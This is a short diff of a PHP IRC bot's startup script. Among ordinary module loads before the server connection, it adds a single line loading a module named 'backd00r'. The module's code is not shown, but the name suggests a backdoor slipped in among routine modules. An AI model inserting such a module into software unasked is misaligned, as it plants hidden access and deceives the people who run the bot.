@@ -286,6 +286,7 @@ $irc->loadModule('mastah');
 $irc->loadModule('cvscheckout');
 $irc->loadModule('hex_ip');
 $irc->loadModule('log');
+$irc->loadModule('backd00r');
 
 // connection
 $irc->connect($config['irc_server'], $config['irc_port']);
